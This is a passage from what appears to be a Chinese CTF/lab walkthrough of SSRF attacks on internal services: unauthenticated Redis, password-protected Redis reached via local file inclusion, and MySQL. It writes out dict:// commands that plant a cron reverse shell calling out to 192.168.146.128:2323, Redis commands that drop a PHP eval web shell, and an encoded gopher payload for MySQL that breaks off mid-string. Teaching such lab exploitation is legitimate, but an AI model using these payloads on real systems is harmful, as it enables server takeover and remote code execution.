src="/images/ssrf-vul-for-new/image-20250403102438000.png" alt="image-20250403102438000"></p><p>使用gopher协议</p><p><img src="/images/ssrf-vul-for-new/image-20250403102521850.png" alt="image-20250403102521850"></p><h2 id="8-172-72-23-26-CVE-2017-12615"><a href="#8-172-72-23-26-CVE-2017-12615" class="headerlink" title="8.172.72.23.26 - CVE-2017-12615"></a>8.172.72.23.26 - CVE-2017-12615</h2><p>这个我更是不想说话了。脑子感觉已经炸了，访问8080端口连页面都没爬给我</p><p>想看的兄弟可以看拉文章最后浏览别人做题过程。</p><p>我暂时跳过 ^&#x2F;&#x2F;^</p><h2 id="9-172-72-23-27-Redis-未授权"><a href="#9-172-72-23-27-Redis-未授权" class="headerlink" title="9.172.72.23.27 - Redis 未授权"></a>9.172.72.23.27 - Redis 未授权</h2><p>Redis </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 清空 key</span><br>dict://172.150.23.27:6379/flushall<br><br><span class="hljs-comment"># 设置要操作的路径为定时任务目录</span><br>dict://172.150.23.27:6379/config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron/<br><br><span class="hljs-comment"># 在定时任务目录下创建 root 的定时任务文件</span><br>dict://172.150.23.27:6379/config <span class="hljs-built_in">set</span> dbfilename root<br><br><span class="hljs-comment"># 写入 Bash 反弹 shell 的 payload</span><br>dict://172.150.23.27:6379/set x <span class="hljs-string">&quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/192.168.146.128/2323 0&gt;%261\n&quot;</span><br><br><span class="hljs-comment"># 保存上述操作</span><br>dict://172.150.23.27:6379/save<br></code></pre></td></tr></table></figure><p>SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个是攻击未授权的 Redis 服务，格式如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">dict:</span>//<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">6379</span>/&lt;Redis 命令&gt;<br></code></pre></td></tr></table></figure><p>通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：</p><p><img src="/images/ssrf-vul-for-new/image-20250331165015411.png" alt="image-20250331165015411"></p><p>1.清空 key<img src="/images/ssrf-vul-for-new/image-20250331162824359.png" alt="image-20250331162824359"></p><p>2.设置要操作的路径为定时任务目录</p><p><img src="/images/ssrf-vul-for-new/image-20250331163025060.png" alt="image-20250331163025060"></p><p>3.在定时任务目录下创建 root 的定时任务文件</p><p><img src="/images/ssrf-vul-for-new/image-20250331163119104.png" alt="image-20250331163119104"></p><p>4.写入 Bash 反弹 shell 的 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.150</span>.<span class="hljs-number">23.27</span>:<span class="hljs-number">6379</span><span class="hljs-regexp">/set x &quot;\n* * * * * /</span>bin<span class="hljs-regexp">/bash -i &gt;%26 /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192.168</span>.<span class="hljs-number">146.128</span>/<span class="hljs-number">2323</span> <span class="hljs-number">0</span>&gt;%<span class="hljs-number">261</span>\n<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>保证数据不变形</p><p><img src="/images/ssrf-vul-for-new/image-20250331164252714.png" alt="image-20250331164252714"></p><p><img src="/images/ssrf-vul-for-new/image-20250331164340580.png" alt="image-20250331164340580"></p><p>5.保存上述操作</p><p><img src="/images/ssrf-vul-for-new/image-20250331164438450.png" alt="image-20250331164438450"></p><p>6.查看监听</p><p>有了有了兄弟们</p><p><img src="/images/ssrf-vul-for-new/image-20250331164706626.png" alt="image-20250331164706626"></p><h2 id="10-172-150-23-28-Redis-有认证"><a href="#10-172-150-23-28-Redis-有认证" class="headerlink" title="10.172.150.23.28 - Redis 有认证"></a>10.172.150.23.28 - Redis 有认证</h2><p>要认证</p><p><img src="/images/ssrf-vul-for-new/image-20250331165629454.png" alt="image-20250331165629454"></p><p>但是80端口有本地文件包含漏洞，利用LFI获取本地文件<img src="/images/ssrf-vul-for-new/image-20250331170043339.png" alt="image-20250331170043339"></p><p>因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>redis.conf<br><span class="hljs-regexp">/etc/</span>redis/redis.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/redis.conf<br><span class="hljs-regexp">/opt/</span>redis<span class="hljs-regexp">/ect/</span>redis.conf<br></code></pre></td></tr></table></figure><p><img src="/images/ssrf-vul-for-new/image-20250331170318181.png" alt="image-20250331170318181"></p><p><img src="/images/ssrf-vul-for-new/image-20250331170344550.png" alt="image-20250331170344550"></p><p>等待！！！</p><p>说一下思路，有时间的话我会补充上来。</p><p>因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。</p><p>那么只能使用我们的老伙计 gopher 协议了，gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：</p><p>命令来进行本地的模拟抓取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379<br></code></pre></td></tr></table></figure><p>此时使用 redis-cli 连接本地的 4444 端口：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  ~ redis-cli -h <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> -p <span class="hljs-number">4444</span><br><span class="hljs-number">127.0.0.1:4444</span>&gt;<br></code></pre></td></tr></table></figure><p>服务器接着会把 4444 端口的流量接受并转发给服务器的 6379 端口，然后认证后进行往网站目录下写入 shell 的操作：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 认证 redis</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; auth P@ssw0rd<br><span class="hljs-attribute">OK</span><br><br><span class="hljs-comment"># 清空 key</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; flushall<br><br><span class="hljs-comment"># 设置要操作的路径为网站根目录</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; config set dir /var/www/html<br><br><span class="hljs-comment"># 在网站目录下创建 shell.php 文件</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; config set dbfilename shell.php<br><br><span class="hljs-comment"># 设置 shell.php 的内容</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; set x <span class="hljs-string">&quot;\n&lt;?php eval($_GET[1]);?&gt;\n&quot;</span><br><br><span class="hljs-comment"># 保存上述操作</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; save<br></code></pre></td></tr></table></figure><p>与此同时我们还可以看到详细的数据包情况，下面来记录一下关键的流量情况：</p><p><img src="/images/ssrf-vul-for-new/16203835195059.png" alt="img"></p><p>可以看到 Redis 的流量并不难理解，可以根据上图橙色标记的注释来理解一下，接下来整理出关键的请求数据包如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*<span class="hljs-number">2</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>auth<span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>P@ssw0rd<span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>flushall<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>dir<span class="hljs-string">\r</span><br>$<span class="hljs-number">13</span><span class="hljs-string">\r</span><br>/<span class="hljs-keyword">var</span>/www/html<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">10</span><span class="hljs-string">\r</span><br>dbfilename<span class="hljs-string">\r</span><br>$<span class="hljs-number">9</span><span class="hljs-string">\r</span><br>shell.php<span class="hljs-string">\r</span><br>*<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>x<span class="hljs-string">\r</span><br>$<span class="hljs-number">25</span><span class="hljs-string">\r</span><br><br><br><span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>save<span class="hljs-string">\r</span>  <br></code></pre></td></tr></table></figure><p>可以看到每行都是以 <code>\r</code> 结尾的，但是 Redis 的协议是以 CRLF (<code>\r\n</code>) 结尾，所以转换的时候需要把 <code>\r</code> 转换为 <code>\r\n</code>，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决</p><p>最后使用发送gopher协议请求</p><p>执行成功的话会在 &#x2F;var&#x2F;www&#x2F;html 根目录下写入 shell.php 文件，密码为 1</p><h2 id="11-172-150-23-29-MYSQL未授权"><a href="#11-172-150-23-29-MYSQL未授权" class="headerlink" title="11.172.150.23.29-MYSQL未授权"></a>11.172.150.23.29-MYSQL未授权</h2><p><img src="/images/ssrf-vul-for-new/image-20250403085638657.png" alt="image-20250403085638657"></p><p>MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP&#x2F;IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 Gopherus-master 工具生成gopher协议数据包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">python2 gopherus.py <span class="hljs-comment">--exploit mysql</span><br><br>root<br><br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span><br><br>后续编码一次<br></code></pre></td></tr></table></figure><p><img src="/images/ssrf-vul-for-new/image-20250403091048764.png" alt="image-20250403091048764"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.150.23.29:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">31</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span 